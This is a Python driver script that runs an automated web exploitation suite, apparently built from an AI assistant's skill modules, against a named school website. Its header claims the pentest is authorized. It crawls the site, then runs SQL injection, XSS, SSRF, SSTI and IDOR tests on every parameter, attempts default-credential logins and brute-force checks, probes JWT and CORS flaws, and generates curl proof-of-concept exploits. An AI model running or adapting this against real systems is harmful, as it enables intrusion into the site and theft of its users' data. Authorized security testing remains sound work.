#!/usr/bin/env python3
"""
webapp-exploit-hunter driver for dlsmhsi.edu.ph
Authorized pentest — calls all modules directly (no subprocess, no interactive input).
"""

import sys
import json
import time
import importlib.util
from pathlib import Path
from datetime import datetime

TARGET = "https://dlsmhsi.edu.ph"
OUTPUT_DIR = Path(__file__).parent
SKILLS_DIR = Path("/home/maeitsec/.claude/skills/webapp-exploit-hunter/scripts")


def load_module(name):
    spec = importlib.util.spec_from_file_location(name, SKILLS_DIR / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def banner(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def save_json(data, filename):
    path = OUTPUT_DIR / filename
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[+] Saved: {path}")
    return str(path)


# Step 1: Crawl
banner("STEP 1: CRAWLING dlsmhsi.edu.ph")
crawler = load_module("crawler")
crawl_result = crawler.crawl(TARGET, max_depth=3, max_pages=150)
crawl_path = save_json(crawl_result, "crawl_results.json")

endpoints = crawl_result.get("endpoints", [])
forms = crawl_result.get("forms", [])
print(f"[*] Endpoints discovered : {len(endpoints)}")
print(f"[*] Forms discovered     : {len(forms)}")

param_targets = []
for ep in endpoints:
    for pname in ep.get("params", {}):
        param_targets.append({"url": ep["url"], "param": pname, "method": "GET"})
for form in forms:
    for inp in form.get("inputs", []):
        if inp.get("name") and inp.get("type") not in ("hidden", "submit", "button", "file", "password"):
            param_targets.append({
                "url": form.get("url", TARGET),
                "param": inp["name"],
                "method": form.get("method", "POST").upper(),
            })

print(f"[*] Parameters to test   : {len(param_targets)}")
all_findings = []

# Step 2: SQLi
banner("STEP 2: SQL INJECTION TESTING")
sqli = load_module("sqli_tester")
sqli_findings = []
for t in param_targets:
    print(f"[*] SQLi -> {t['param']} on {t['url']}")
    try:
        ef = sqli.test_error_based(t["url"], t["param"], "", t["method"])
        if ef:
            ef["param"] = t["param"]
            sqli_findings.append(ef)
            continue
        bf = sqli.test_boolean_based(t["url"], t["param"], "", t["method"])
        if bf:
            bf["param"] = t["param"]
            sqli_findings.append(bf)
            continue
        tbf = sqli.test_time_based(t["url"], t["param"], "", t["method"])
        if tbf:
            tbf["param"] = t["param"]
            sqli_findings.append(tbf)
    except Exception as e:
        print(f"[!] SQLi error on {t['param']}: {e}")
    time.sleep(0.3)

sqli_out = {"meta": {"type": "sqli_test", "timestamp": datetime.utcnow().isoformat()+"Z",
                     "vulnerabilities_found": len(sqli_findings)}, "findings": sqli_findings}
save_json(sqli_out, "sqli_findings.json")
all_findings.extend(sqli_findings)

# Step 3: XSS
banner("STEP 3: XSS TESTING")
xss = load_module("xss_tester")
xss_findings = []
for t in param_targets:
    print(f"[*] XSS -> {t['param']} on {t['url']}")
    try:
        reflection = xss.test_reflection(t["url"], t["param"], t["method"])
        if not reflection["reflected"]:
            continue
        print(f"  [+] Reflected in: {reflection['contexts']}")
        findings = xss.test_xss_payloads(
            t["url"], t["param"], reflection["contexts"],
            t["method"], {}, try_bypass=True)
        xss_findings.extend(findings)
    except Exception as e:
        print(f"[!] XSS error on {t['param']}: {e}")
    time.sleep(0.3)

xss_out = {"meta": {"type": "xss_test", "timestamp": datetime.utcnow().isoformat()+"Z",
                    "vulnerabilities_found": len(xss_findings)}, "findings": xss_findings}
save_json(xss_out, "xss_findings.json")
all_findings.extend(xss_findings)

# Step 4: SSRF
banner("STEP 4: SSRF TESTING")
ssrf = load_module("ssrf_tester")
ssrf_findings = []
ssrf_params = [t for t in param_targets if ssrf.is_ssrf_param(t["param"])]
if not ssrf_params:
    ssrf_params = param_targets[:20]
print(f"[*] SSRF candidate parameters: {len(ssrf_params)}")
for t in ssrf_params:
    print(f"[*] SSRF -> {t['param']} on {t['url']}")
    try:
        findings = ssrf.test_ssrf(t["url"], t["param"], t["method"], {}, delay=0.3)
        ssrf_findings.extend(findings)
    except Exception as e:
        print(f"[!] SSRF error on {t['param']}: {e}")
    time.sleep(0.3)

ssrf_out = {"meta": {"type": "ssrf_test", "timestamp": datetime.utcnow().isoformat()+"Z",
                     "vulnerabilities_found": len(ssrf_findings)}, "findings": ssrf_findings}
save_json(ssrf_out, "ssrf_findings.json")
all_findings.extend(ssrf_findings)

# Step 5: SSTI
banner("STEP 5: SSTI TESTING")
ssti = load_module("ssti_tester")
ssti_findings = []
for t in param_targets:
    print(f"[*] SSTI -> {t['param']} on {t['url']}")
    try:
        if not ssti.test_reflection(t["url"], t["param"], t["method"]):
            continue
        print(f"  [+] Reflection confirmed, fingerprinting engine...")
        findings = ssti.fingerprint_engine(t["url"], t["param"], t["method"], {}, delay=0.3)
        ssti_findings.extend(findings)
    except Exception as e:
        print(f"[!] SSTI error on {t['param']}: {e}")
    time.sleep(0.3)

ssti_out = {"meta": {"type": "ssti_test", "timestamp": datetime.utcnow().isoformat()+"Z",
                     "vulnerabilities_found": len(ssti_findings)}, "findings": ssti_findings}
save_json(ssti_out, "ssti_findings.json")
all_findings.extend(ssti_findings)

# Step 6: IDOR
banner("STEP 6: IDOR TESTING")
idor = load_module("idor_tester")
idor_findings = []
id_targets = []
for ep in endpoints:
    for pname, pval in ep.get("params", {}).items():
        val = pval[0] if isinstance(pval, list) else str(pval)
        if val and idor.detect_id_type(val) in ("numeric", "uuid", "hex"):
            id_targets.append({"url": ep["url"], "param": pname, "id": val, "method": "GET"})

print(f"[*] ID-bearing parameters: {len(id_targets)}")
for t in id_targets:
    id_type = idor.detect_id_type(t["id"])
    print(f"[*] IDOR -> {t['param']}={t['id']} ({id_type}) on {t['url']}")
    try:
        f1 = idor.test_horizontal_idor(t["url"], t["param"], t["id"], id_type, t["method"], {}, delay=0.3)
        idor_findings.extend(f1)
        f2 = idor.test_vertical_idor(t["url"], t["param"], t["id"], {}, delay=0.3)
        idor_findings.extend(f2)
    except Exception as e:
        print(f"[!] IDOR error on {t['param']}: {e}")
    time.sleep(0.3)

idor_out = {"meta": {"type": "idor_test", "timestamp": datetime.utcnow().isoformat()+"Z",
                     "vulnerabilities_found": len(idor_findings)}, "findings": idor_findings}
save_json(idor_out, "idor_findings.json")
all_findings.extend(idor_findings)

# Step 7: Auth & Session
banner("STEP 7: AUTH & SESSION TESTING")
auth = load_module("auth_tester")
auth_findings = []
try:
    auth_findings.extend(auth.check_security_headers(TARGET, {}))
    login_eps = auth.detect_login_endpoints(TARGET, {}, delay=0.5)
    print(f"[*] Login endpoints found: {len(login_eps)}")
    if login_eps:
        auth_findings.extend(auth.test_default_credentials(login_eps, auth.DEFAULT_CREDS, {}, delay=0.4))
        auth_findings.extend(auth.test_brute_force_protection(login_eps, {}, delay=0.2))
    auth_findings.extend(auth.analyze_session_cookies(TARGET, {}))
    auth_findings.extend(auth.analyze_jwt(TARGET, {}))
    auth_findings.extend(auth.test_password_reset(TARGET, {}, delay=0.3))
    auth_findings.extend(auth.test_cors_misconfiguration(TARGET, {}))
except Exception as e:
    print(f"[!] Auth test error: {e}")

auth_out = {"meta": {"type": "auth_session_test", "timestamp": datetime.utcnow().isoformat()+"Z",
                     "vulnerabilities_found": len(auth_findings)}, "findings": auth_findings}
save_json(auth_out, "auth_findings.json")
all_findings.extend(auth_findings)

# Step 8: PoC Generation
banner("STEP 8: GENERATING POCs FOR ALL FINDINGS")
poc_gen = load_module("generate_poc")
enriched = []
for finding in all_findings:
    try:
        enriched.append(poc_gen.enrich_finding(finding))
    except Exception as e:
        print(f"[!] PoC gen error: {e}")
        enriched.append(finding)

combined_out = {
    "meta": {
        "target": TARGET,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "tool": "webapp-exploit-hunter by orizon.one",
        "total_findings": len(enriched),
        "poc_generated": True,
    },
    "findings": enriched,
}
save_json(combined_out, "all_findings_poc.json")

# Final Summary
banner("SCAN COMPLETE -- SUMMARY")
by_type = {}
by_severity = {}
for f in enriched:
    ftype = f.get("type", "unknown")
    sev = f.get("severity", "INFO")
    by_type[ftype] = by_type.get(ftype, 0) + 1
    by_severity[sev] = by_severity.get(sev, 0) + 1

print(f"  Target         : {TARGET}")
print(f"  Endpoints      : {len(endpoints)}")
print(f"  Forms          : {len(forms)}")
print(f"  Parameters     : {len(param_targets)}")
print(f"  Total Findings : {len(enriched)}")
print()
print("  By Severity:")
for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
    cnt = by_severity.get(sev, 0)
    if cnt:
        print(f"    {sev:10s} : {cnt}")
print()
print("  By Type:")
for ftype, cnt in sorted(by_type.items()):
    print(f"    {ftype:35s} : {cnt}")
print()

vuln_types = {"sqli", "xss", "ssrf", "ssti", "idor", "default_creds", "jwt_none_algorithm",
              "jwt_empty_signature", "cors_misconfiguration", "reflected_xss"}
confirmed = [f for f in enriched if f.get("type") in vuln_types]
if confirmed:
    print("  Confirmed Vulnerabilities:")
    for f in confirmed:
        url = f.get("url", "")
        param = f.get("param", f.get("parameter", ""))
        sev = f.get("severity", "?")
        print(f"    [{sev}] {f['type']} -- {param} -- {url}")
        if f.get("poc_curl"):
            print(f"           PoC: {str(f['poc_curl'])[:100]}")

print(f"\n  Output files in: {OUTPUT_DIR}")
print(f"{'='*60}\n")
